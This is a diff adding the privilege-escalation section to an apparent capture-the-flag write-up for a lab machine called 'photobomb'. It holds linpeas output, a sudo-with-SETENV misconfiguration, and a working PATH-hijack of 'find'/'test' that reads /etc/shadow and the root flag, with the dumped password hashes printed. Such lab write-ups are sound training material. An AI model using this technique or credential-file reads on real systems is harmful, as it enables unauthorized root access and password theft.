@@ -242,9 +242,199 @@ $ cat ../user.txt
 
 ### pivot
 
+starting with linpeas:
+
+```
+╔══════════╣ CVEs Check
+Vulnerable to CVE-2021-3560
+
+Potentially Vulnerable to CVE-2022-2588
+
+# m h  dom mon dow   command
+*/5 * * * * sudo /opt/cleanup.sh
+
+╔══════════╣ Active Ports
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
+tcp        0      0 127.0.0.1:4567          0.0.0.0:*               LISTEN      755/ruby
+tcp6       0      0 :::80                   :::*                    LISTEN      -
+tcp6       0      0 :::22                   :::*                    LISTEN      -
+
+
+╔══════════╣ Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+
+```
+
+CVE-2021-3560 looks interesting, but `/opt/cleanup.sh` is almost certainly the path forward
+
+```bash
+$ cat /opt/cleanup.sh
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+
+...
+$ cat /opt/.bashrc
+# System-wide .bashrc file for interactive bash(1) shells.
+
+# To enable the settings / commands in this file for login shells as well,
+# this file has to be sourced in /etc/profile.
+
+# Jameson: ensure that snaps don't interfere, 'cos they are dumb
+PATH=${PATH/:\/snap\/bin/}
+
+# Jameson: caused problems with testing whether to rotate the log file
+enable -n [ # ]
+```
+
+so everything is fully qualified except `find`, and there's some $PATH shenanigans in `.bashrc`
+
+ok, getting a real shell before going further
+
+```
+wizard@photobomb:~$ which enable
+wizard@photobomb:~$ enable --help
+enable: enable [-a] [-dnps] [-f filename] [name ...]
+    Enable and disable shell builtins.
+
+    Enables and disables builtin shell commands.  Disabling allows you to
+    execute a disk command which has the same name as a shell builtin
+    without using a full pathname.
+
+    Options:
+      -a        print a list of builtins showing whether or not each is enabled
+      -n        disable each NAME or display a list of disabled builtins
+      -p        print the list of builtins in a reusable format
+      -s        print only the names of Posix `special' builtins
+
+    Options controlling dynamic loading:
+      -f        Load builtin NAME from shared object FILENAME
+      -d        Remove a builtin loaded with -f
+
+    Without options, each NAME is enabled.
+
+    To use the `test' found in $PATH instead of the shell builtin
+    version, type `enable -n test'.
+
+    Exit Status:
+    Returns success unless NAME is not a shell builtin or an error occurs.
+wizard@photobomb:~$
+
+```
+
+trying to hard. this is easy - just set PATH before running
+
+```
+wizard@photobomb:~$ vim find
+wizard@photobomb:~$ chmod +x find
+wizard@photobomb:~$ cat find
+#!/bin/bash
+
+cat /etc/shadow
+cat /root/root.txt
+```
+
+this is not being hit with
+
+```
+wizard@photobomb:~$ ls /tmp
+systemd-private-07994400efbc437babcdb162afd052f2-ModemManager.service-Ysj3oj    systemd-private-07994400efbc437babcdb162afd052f2-systemd-resolved.service-5HsKWi   tmux-1000
+systemd-private-07994400efbc437babcdb162afd052f2-systemd-logind.service-djoIrg  systemd-private-07994400efbc437babcdb162afd052f2-systemd-timesyncd.service-g7wNIg  vmware-root_664-2722697761
+wizard@photobomb:~$ PATH=.:$PATH sudo /opt/cleanup.sh
+wizard@photobomb:~$ ls /tmp
+systemd-private-07994400efbc437babcdb162afd052f2-ModemManager.service-Ysj3oj    systemd-private-07994400efbc437babcdb162afd052f2-systemd-resolved.service-5HsKWi   tmux-1000
+systemd-private-07994400efbc437babcdb162afd052f2-systemd-logind.service-djoIrg  systemd-private-07994400efbc437babcdb162afd052f2-systemd-timesyncd.service-g7wNIg  vmware-root_664-2722697761
+```
+
+
+so looks like we need to exploit
+```
+# Jameson: caused problems with testing whether to rotate the log file
+enable -n [ # ]
+```
+
+googling around got to
+```
+Example
+
+To use the test binary found via $PATH instead of the shell builtin version:
+
+$ enable -n test
+```
+
+ok, so
+```
+wizard@photobomb:~/photobomb$ cp find test
+wizard@photobomb:~/photobomb$ which test
+/usr/bin/test
+wizard@photobomb:~/photobomb$ enable -n test
+wizard@photobomb:~/photobomb$ PATH=.:$PATH which test
+./test
+```
+
+still no -- but
+
+```
+wizard@photobomb:~/photobomb$ sudo PATH=.:$PATH /opt/cleanup.sh 
+root:$6$7MU2U.CeiY0WX91P$TUNn8zNu/XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V/yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240:19251:0:99999:7:::
+daemon:*:19046:0:99999:7:::
+bin:*:19046:0:99999:7:::
+sys:*:19046:0:99999:7:::
+sync:*:19046:0:99999:7:::
+games:*:19046:0:99999:7:::
+man:*:19046:0:99999:7:::
+lp:*:19046:0:99999:7:::
+mail:*:19046:0:99999:7:::
+news:*:19046:0:99999:7:::
+uucp:*:19046:0:99999:7:::
+proxy:*:19046:0:99999:7:::
+www-data:*:19046:0:99999:7:::
+backup:*:19046:0:99999:7:::
+list:*:19046:0:99999:7:::
+irc:*:19046:0:99999:7:::
+gnats:*:19046:0:99999:7:::
+nobody:*:19046:0:99999:7:::
+systemd-network:*:19046:0:99999:7:::
+systemd-resolve:*:19046:0:99999:7:::
+systemd-timesync:*:19046:0:99999:7:::
+messagebus:*:19046:0:99999:7:::
+syslog:*:19046:0:99999:7:::
+_apt:*:19046:0:99999:7:::
+tss:*:19046:0:99999:7:::
+uuidd:*:19046:0:99999:7:::
+tcpdump:*:19046:0:99999:7:::
+landscape:*:19046:0:99999:7:::
+pollinate:*:19046:0:99999:7:::
+usbmux:*:19067:0:99999:7:::
+sshd:*:19067:0:99999:7:::
+systemd-coredump:!!:19067::::::
+wizard:$6$qmjmqNE6eDSugXXx$KSXyEnRqlVcnAOT9iqxGRsrwnakYHAlF8mNMpEE75i3ZHA0T23OVnedmK3rbaw2gMFbLekluAtgByD/mySzsy1:19077:0:99999:7:::
+lxd:!:19067::::::
+e107bf2bbf998497a8a29e5fec75cec5
+```
+
+OOP
 
 ## flag
 ```
 user:204b628c44f7f32c5920cc4bdc369d62
-root:
+root:e107bf2bbf998497a8a29e5fec75cec5
 ```
